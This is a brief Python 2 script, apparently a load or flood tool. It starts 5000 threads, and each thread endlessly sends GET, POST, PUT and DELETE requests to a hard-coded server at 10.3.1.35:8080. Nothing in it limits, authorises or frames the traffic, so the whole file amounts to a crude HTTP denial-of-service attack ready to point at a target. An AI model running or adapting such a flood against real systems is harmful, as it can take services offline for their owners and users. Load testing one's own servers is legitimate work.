import requests
import threading
from time import sleep

def requisicao(ip, id_th):
    print 'thread' + str(id_th)
    while True:
        requests.get(ip)
        requests.post(ip) 
        requests.put(ip) 
        requests.delete(ip)  

threads = []  
  
for i in range(0, 5000):
    i = threading.Thread(target=requisicao, args=['http://10.3.1.35:8080', i])
    threads.append(i)

for i in threads:    
    i.start()


